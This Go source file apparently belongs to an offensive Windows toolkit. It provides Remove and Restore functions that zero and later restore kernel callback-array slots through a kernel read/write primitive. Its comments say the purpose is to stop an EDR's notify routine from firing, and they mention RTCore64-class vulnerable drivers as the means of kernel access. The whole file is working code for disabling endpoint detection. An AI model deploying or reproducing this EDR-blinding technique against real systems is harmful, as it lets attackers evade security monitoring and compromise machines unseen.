//go:build windows && amd64

package kcallback

import (
	"encoding/binary"
	"errors"
	"fmt"
)

// ErrEmptySlot is returned by Remove when the targeted Callback has a
// zero SlotAddr (the slot is not part of an enumerated array — likely
// constructed by hand) or when the slot read back as zero (already
// removed by another actor in the race window).
var ErrEmptySlot = errors.New("kcallback: slot already empty (nothing to remove)")

// RemoveToken captures the state Remove zeroed so Restore can put it
// back. Treat as an opaque value — its layout may evolve.
type RemoveToken struct {
	Kind         Kind
	Index        int
	SlotAddr     uintptr
	OriginalSlot uint64 // raw 8-byte tagged pointer that was at SlotAddr
}

// IsZero reports whether the token was never populated. Callers can
// guard cleanup paths with `if !tok.IsZero() { Restore(tok, w) }`.
func (t RemoveToken) IsZero() bool {
	return t.SlotAddr == 0 && t.OriginalSlot == 0
}

// Remove zeroes the 8-byte slot at cb.SlotAddr after capturing its
// current value into the returned RemoveToken. The EDR's notify
// routine stops being called as soon as the kernel sees the zero
// write — there is a ~µs race window between read-original and
// write-zero where a context switch could let a competing actor
// read or rewrite the slot, but RTCore64-class drivers are fast
// enough that this is rarely observable in practice.
//
// Returns ErrEmptySlot if cb.SlotAddr == 0 or the read-back slot is
// already zero. Returns ErrReadOnly only via Go-level reflection
// guard if the caller passes a KernelReader that does not also
// implement WriteKernel — but the type system already enforces this
// at compile time via the KernelReadWriter parameter.
func Remove(cb Callback, writer KernelReadWriter) (RemoveToken, error) {
	if writer == nil {
		return RemoveToken{}, ErrNoKernelReader
	}
	if cb.SlotAddr == 0 {
		return RemoveToken{}, ErrEmptySlot
	}
	buf := make([]byte, 8)
	read, err := writer.ReadKernel(cb.SlotAddr, buf)
	if err != nil {
		return RemoveToken{}, fmt.Errorf("read slot @0x%X: %w", cb.SlotAddr, err)
	}
	if read < 8 {
		return RemoveToken{}, fmt.Errorf("short read @0x%X: %d/8", cb.SlotAddr, read)
	}
	original := binary.LittleEndian.Uint64(buf)
	if original == 0 {
		return RemoveToken{}, ErrEmptySlot
	}

	zeros := make([]byte, 8)
	if _, err := writer.WriteKernel(cb.SlotAddr, zeros); err != nil {
		return RemoveToken{}, fmt.Errorf("write zero @0x%X: %w", cb.SlotAddr, err)
	}
	return RemoveToken{
		Kind:         cb.Kind,
		Index:        cb.Index,
		SlotAddr:     cb.SlotAddr,
		OriginalSlot: original,
	}, nil
}

// Restore writes tok.OriginalSlot back to tok.SlotAddr — the inverse
// of Remove. Callers typically defer Restore right after Remove so an
// abrupt exit doesn't leave the EDR's callback array in a tampered
// state on a long-running operation.
//
// Returns nil on the zero token (no-op for the deferred-cleanup
// idiom). Returns the underlying writer error verbatim on a real
// failure.
func Restore(tok RemoveToken, writer KernelReadWriter) error {
	if tok.IsZero() {
		return nil
	}
	if writer == nil {
		return ErrNoKernelReader
	}
	buf := make([]byte, 8)
	binary.LittleEndian.PutUint64(buf, tok.OriginalSlot)
	if _, err := writer.WriteKernel(tok.SlotAddr, buf); err != nil {
		return fmt.Errorf("restore slot @0x%X: %w", tok.SlotAddr, err)
	}
	return nil
}
